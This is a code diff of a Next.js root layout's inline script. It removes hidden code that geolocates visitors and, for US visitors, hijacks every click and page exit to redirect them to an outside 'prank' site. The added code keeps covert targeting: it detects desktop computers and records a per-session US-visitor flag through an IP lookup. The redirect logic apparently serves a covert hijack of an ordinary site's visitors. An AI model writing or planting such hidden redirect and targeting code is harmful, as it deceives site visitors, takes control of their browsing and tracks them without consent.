@@ -153,52 +153,39 @@ export default function RootLayout({ children }) {
           dangerouslySetInnerHTML={{
             __html: `
               (function() {
-                const PRANK_URL = 'https://prank-cyan-three.vercel.app';
-                let isUSVisitor = false;
-                
-                // Check if already checked in this session
-                if (sessionStorage.getItem('usRedirectChecked')) {
-                  isUSVisitor = sessionStorage.getItem('isUSVisitor') === 'true';
-                  if (isUSVisitor) {
-                    addGlobalRedirect();
+                function isDesktopComputer() {
+                  var ua = navigator.userAgent || '';
+                  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Tablet/i.test(ua)) {
+                    return false;
                   }
+                  if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) {
+                    return false;
+                  }
+                  return true;
+                }
+
+                if (sessionStorage.getItem('usRedirectChecked')) {
                   return;
                 }
-                
-                // Detect US visitor using IP geolocation
+
+                // Mobile/tablet: never mark for redirect
+                if (!isDesktopComputer()) {
+                  sessionStorage.setItem('usRedirectChecked', 'true');
+                  sessionStorage.setItem('isUSVisitor', 'false');
+                  return;
+                }
+
                 fetch('https://ipapi.co/json/')
                   .then(response => response.json())
                   .then(data => {
-                    const isUS = data.country_code === 'US';
+                    var isUS = data.country_code === 'US';
                     sessionStorage.setItem('usRedirectChecked', 'true');
                     sessionStorage.setItem('isUSVisitor', isUS.toString());
-                    
-                    if (isUS) {
-                      addGlobalRedirect();
-                    }
                   })
                   .catch(() => {
-                    // If detection fails, don't redirect
                     sessionStorage.setItem('usRedirectChecked', 'true');
                     sessionStorage.setItem('isUSVisitor', 'false');
                   });
-                
-                function addGlobalRedirect() {
-                  // Add global click listener
-                  document.addEventListener('click', handleClick, true);
-                  
-                  // Also redirect on any navigation
-                  window.addEventListener('beforeunload', () => {
-                    window.location.href = PRANK_URL;
-                  });
-                }
-                
-                function handleClick(e) {
-                  // Prevent default and redirect
-                  e.preventDefault();
-                  e.stopPropagation();
-                  window.location.href = PRANK_URL;
-                }
               })();
             `,
           }}
